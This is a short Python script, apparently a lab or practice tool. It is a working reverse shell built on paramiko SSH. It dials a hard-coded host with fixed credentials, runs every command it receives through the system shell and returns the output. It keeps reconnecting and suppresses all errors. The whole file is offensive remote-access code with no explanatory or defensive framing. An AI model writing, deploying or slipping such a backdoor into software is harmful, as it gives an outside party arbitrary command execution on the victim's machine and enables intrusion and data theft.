import paramiko
import subprocess

HOST = '10.10.10.10'
USERNAME = 'test'
PASSWORD = 'test'
PORT = 2022
run = True

while True:
  if run == False:
    break
  else:
    try:
      client = paramiko.SSHClient()
      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
      chan = client.get_transport().open_session()
      chan.send('Command Shell Open')
      while True:
          command = chan.recv(1024).decode()
          if command == 'exit':
            run = False
            client.close()
            break
          elif command == 'reset':
            run = True
            client.close()
            break
          else:
            try:
              process = subprocess.run(command, shell=True, capture_output=True, text=True)
              if str(process.stderr).startswith("/bin/sh:"):
                chan.send(str(process.stderr))
                cmd = ''
              elif str(process.stdout) == "" and str(process.stderr) == "":
                chan.send('No data returned')
                cmd = ''
              elif str(process.stdout) == "":
                chan.send(str(process.stderr))
                cmd = str(process.stderr)
              else:
                cmd = str(process.stdout)
                try:
                  chan.send(cmd)
                except Exception as e:
                  chan.send(e)
            except subprocess.CalledProcessError as e:
                chan.send(e)
                client.close()
    except:
      pass
